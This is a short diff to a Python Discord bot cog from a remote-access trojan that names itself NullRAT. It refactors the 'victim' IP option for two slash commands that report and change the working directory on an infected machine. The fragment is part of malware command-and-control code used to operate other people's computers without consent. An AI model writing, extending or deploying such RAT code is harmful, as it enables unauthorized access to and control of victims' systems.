@@ -12,9 +12,7 @@ class DirectoryCommands(commands.Cog):
         
     @commands.slash_command(
         description="Returns Current Working Directory",
-        options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
-        ]
+        options=[self.bot.victim]
     )
     async def get_currentdir(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
@@ -29,7 +27,7 @@ class DirectoryCommands(commands.Cog):
     @commands.slash_command(
         description="Change directory to specified location",
         options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
+            self.bot.victim,
             discord.Option("directory", description="New directory where NullRAT will CD", required=True),
         ]
     )
